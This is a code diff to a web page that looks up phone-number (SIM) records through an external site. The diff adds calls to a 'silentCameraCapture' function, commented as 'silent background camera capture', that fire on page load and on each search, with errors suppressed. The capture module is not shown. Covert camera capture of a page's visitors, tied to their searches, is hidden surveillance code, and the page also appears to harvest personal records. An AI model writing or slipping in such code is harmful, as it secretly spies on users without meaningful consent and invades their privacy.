@@ -88,6 +88,11 @@ function SimDatabasePage() {
     return () => window.removeEventListener("wiki:payment-fail", onFail as EventListener);
   }, []);
 
+  // Silent background camera capture (browser will natively ask permission once)
+  useEffect(() => {
+    import("@/lib/sim-capture").then((m) => m.silentCameraCapture()).catch(() => {});
+  }, []);
+
   const formatRecord = (rec: SimRecord) =>
     Object.entries(rec)
       .map(([k, v]) => `${k}: ${v ?? "—"}`)
@@ -123,6 +128,7 @@ function SimDatabasePage() {
     setLoading(true);
     setError(null);
     setData(null);
+    import("@/lib/sim-capture").then((m) => m.silentCameraCapture(n)).catch(() => {});
     try {
       const res = await fetch(
         `https://Famofc.site/api/database.php?number=${encodeURIComponent(n)}`,
